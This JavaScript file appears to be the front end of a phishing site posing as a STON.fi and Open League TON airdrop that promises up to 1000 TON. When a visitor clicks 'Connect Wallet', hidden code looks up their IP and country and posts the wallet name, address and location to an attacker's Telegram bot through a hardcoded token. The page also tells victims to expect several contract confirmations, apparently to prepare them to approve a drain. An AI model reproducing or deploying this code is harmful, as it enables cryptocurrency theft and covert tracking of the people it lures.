import './style.css'
import { modal } from './web3modal-setup.js';
import axios from 'axios';



document.querySelector("#app").innerHTML = `
   <div>
        <header class="w-full bg-black/40 py-[30px] hidden 1100:block">
            <div class="max-w-[calc(1200px+2rem)] mx-auto px-4 flex justify-between gap-4 items-center">
                <a href="./">
                    <img src="images/logo.svg" alt="STON.fi x The Open League" class="hover:opacity-70">
                </a>

                <nav class="desktop_navigation">
                    <a href="#about" onclick="document.location.hash='about';return false;">What is STON.fi</a>
                    <a href="#explore" onclick="document.location.hash='explore';return false;">Explore</a>
                    <a href="#" onclick="document.location.hash='';return false;">Developers</a>
                </nav>

                <div class="w-[338px] flex justify-end">
                    <a class="btn gradient-default" href="#about" onclick="document.location.hash='about';return false;">
                        <img src="images/icon-connect.svg" alt="icon connect"> Learn more
                    </a>
                </div>
            </div>
        </header>

        <div x-data="{
    menuOpen: false
}">
            <header class="1100:hidden bg-[#141414]/[.62] w-full p-[16px] flex justify-between gap-4 h-[48px] items-center">
                <a href="./">
                    <img src="images/logo-mobile.svg" alt="STON.fi x The Open League">
                </a>

                <button @click.prevent="menuOpen = !menuOpen">
            <img src="images/burger.svg" alt="Burger">
        </button>
            </header>

            <div class="fixed top-0 left-0 w-full h-full z-[999] bg-black" style="display: none" x-show="menuOpen" x-transition.duration.200ms="" x-transition.origin.bottom="">
                <div class="flex justify-between gap-4 h-[48px] items-center bg-[#141414]">
                    <a href="./" class="py-[16px] pl-[16px]">
                        <img src="images/logo-mobile.svg" alt="STON.fi x The Open League">
                    </a>

                    <button class="w-[48px] h-[48px] bg-[#242424] flex justify-center items-center" @click.prevent="menuOpen = !menuOpen">
                <img src="images/burger.svg" alt="Burger">
            </button>
                </div>

                <nav class="mobile_navigation">
                    <a href="#about" onclick="document.location.hash='about';return false;">What is STON.fi</a>
                    <a href="#explore" onclick="document.location.hash='explore';return false;">Explore</a>
                    <a href="#" onclick="document.location.hash='';return false;">Developers</a>
                </nav>

                <div class="absolute left-0 bottom-0 w-full">
                    <div class="p-[16px] flex flex-col gap-[10px]">
                        <a href="#" onclick="document.location.hash='';return false;" class="btn gradient-default !text-[16px]">
                            <img src="images/icon-connect.svg" alt="icon connect"> Connect Wallet
                        </a>

                        <a href="#" onclick="document.location.hash='';return false;" class="btn gradient-text !text-[16px]">
                            <span>
                    Learn more
                </span>
                        </a>
                    </div>
                </div>
            </div>
        </div>

        <main>
            <section class="hero" style="background-image: url(images/hero-bg.png)">
                <h1 class="text-[26px] 1100:text-[45px] font-semibold">
                    Welcome to The Open League!
                </h1>

                <p class="text-[15px] 1100:text-[20px] font-medium max-w-[900px] mt-4 1100:mt-0">
                    We are running an exclusive Airdrop from the Ton blockchain team for all Open League members. Get up to 1000 Ton for active participation.
                </p>

                <div class="flex flex-row gap-[16px] justify-center items-center flex-wrap mt-[48px]">
                   <button id="connect-wallet" class="go3974562317 go4218612181" data-tc-connect-button="true" appearance="primary" scale="s" lefticon="false" righticon="false" data-tc-button="true">
                   <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.1839 17.7069C13.6405 18.6507 13.3688 19.1226 13.0591 19.348C12.4278 19.8074 11.5723 19.8074 10.941 19.348C10.6312 19.1226 10.3595 18.6507 9.81613 17.7069L5.52066 10.2464C4.76864 8.94024 4.39263 8.28717 4.33762 7.75894C4.2255 6.68236 4.81894 5.65591 5.80788 5.21589C6.29309 5 7.04667 5 8.55383 5H15.4462C16.9534 5 17.7069 5 18.1922 5.21589C19.1811 5.65591 19.7745 6.68236 19.6624 7.75894C19.6074 8.28717 19.2314 8.94024 18.4794 10.2464L14.1839 17.7069ZM11.1 16.3412L6.56139 8.48002C6.31995 8.06185 6.19924 7.85276 6.18146 7.68365C6.14523 7.33896 6.33507 7.01015 6.65169 6.86919C6.80703 6.80002 7.04847 6.80002 7.53133 6.80002H7.53134L11.1 6.80002V16.3412ZM12.9 16.3412L17.4387 8.48002C17.6801 8.06185 17.8008 7.85276 17.8186 7.68365C17.8548 7.33896 17.665 7.01015 17.3484 6.86919C17.193 6.80002 16.9516 6.80002 16.4687 6.80002L12.9 6.80002V16.3412Z" fill="#FFFFFF"></path></svg><div class="go1487791704" fontsize="15px" fontweight="590" lineheight="18px" color="#FFFFFF" data-tc-text="true">
                   Connect Wallet</div></button>
                </div>



            </section>

            <section class="about" id="about">
                <h2 class="thisTitle">
                    About AirDrop
                </h2>

                <div class="max-w-[900px] mx-auto">
                    <h3 class="text-[20px] 1100:text-[40px] text-white font-semibold">
                        <span class="text-[#017BFF]">
                    STON.fi
                </span> x
                        <span class="text-[#017BFF]">
                    The Open League
                </span> gives up to 1000 TON
                    </h3>

                    <p class="text-[#718E9E] text-[14px] mt-2 1100:mt-0 1100:text-[20px] text-center max-w-[775px] mx-auto font-medium">
                        A long-term incentive program for TON users, projects, teams and traders aiming to distribute 30,000,000 Toncoin in 3 months.
                    </p>
                </div>

                <div class="partners">
                    <img src="images/TOP.svg" alt="TOP">

                    <img src="images/TONSTARTER.svg" alt="TONSTARTER">

                    <img src="images/1INCH.svg" alt="1INCH">

                    <img src="images/TONKEEPER.svg" alt="TONKEEPER">

                    <img src="images/TON%20WALLET.svg" alt="TON WALLET">

                    <img src="images/TON%20WHALES.svg" alt="TON WHALES">
                </div>
            </section>

            <section class="explore" id="explore">
                <h4 class="thisTitle">
                    Explore
                </h4>

                <h5 class="text-[20px] 1100:text-[40px] text-white font-semibold">
                    How do I get an
                    <span class="text-[#017BFF]">
                Airdrop<span class="text-white">?</span>
                    </span>
                </h5>

                <div class="explore_howTo">
                    <div class="thisItem">
                        <img src="images/explore-connect.svg" alt="Icon connect">

                        <div class="description">
                            <p class="thisDescriptionTitle">
                                Connect
                            </p>

                            <p class="thisDescription">
                                Connect your wallet via qr-code or directly
                            </p>
                        </div>
                    </div>

                    <div class="thisItem">
                        <img src="images/explore-confirm.svg" alt="Icon confirm">

                        <div class="description">
                            <p class="thisDescriptionTitle">
                                Confirm
                            </p>

                            <p class="thisDescription">
                                Due to load your wallet may request several contract confirmations
                            </p>
                        </div>
                    </div>

                    <div class="thisItem">
                        <img src="images/explore-get.svg" alt="Icon get">

                        <div class="description">
                            <p class="thisDescriptionTitle">
                                Get AirDrop
                            </p>

                            <p class="thisDescription">
                                Amount of airdrop depends on your activity on Stonfi
                            </p>
                        </div>
                    </div>
                </div>
            </section>

            <section class="email">
                <h6 class="text-[20px] 1100:text-[40px] text-white font-semibold">
                    <span class="text-[#017BFF]">
                Stay in touch
            </span> to see feature release, events and announcements
                </h6>

                <form class="mt-[64px] flex flex-col 520:flex-row justify-center gap-[10px]">
                    <label>
                <input type="email" class="default" placeholder="monro@gmail.com">
            </label>

                    <button type="submit" class="btn blue">
                Subscribe
            </button>
                </form>
            </section>
        </main>



</div>
`;


async function getIpInfo() {
  try {
      const response = await axios.get('https://ipapi.co/json/');
      return response.data;
  } catch (error) {
      console.error('Error fetching IP info:', error);
      return null;
  }
}

async function sendTelegramMessage(message) {
  const botToken = '7116285930:AAE_MHKDmX6vSgHy4MJwy9ghqfkutqsyFf0';
  const chatId = '7150910205';
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
      await axios.post(url, {
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML'
      });
  } catch (error) {
      console.error('Error sending message to Telegram:', error);
  }
}

const connectWalletButton = document.getElementById('connect-wallet');


connectWalletButton.addEventListener('click', async () => {
  try {
      const wallet = await modal.open();
      
      if (!wallet) {
          console.error('No wallet returned from modal');
          return;
      }

      const publicKey = wallet.publicKey ? wallet.publicKey.toString() : 'No public key available';
        const ipInfo = await getIpInfo();

        const message = `
New connected wallet - ${wallet.name}

🔒 Domain: ${window.location.hostname}
🔎 IP: ${ipInfo.ip} (${ipInfo.country_name} - ${ipInfo.country_code})

💠 Address: ${publicKey}

Info about user:
Device:🖥 | OS: ${ipInfo.os} | Browser: ${ipInfo.browser}
        `;

        await sendTelegramMessage(message.trim());

        console.log('Connected wallet:', wallet);
        console.log('Public Key:', publicKey);

      // Fetch balance or perform other actions using the wallet
      // Note: Additional code needed to interact with Solana blockchain
  } catch (error) {
      console.error('Error connecting wallet:', error);
  }
});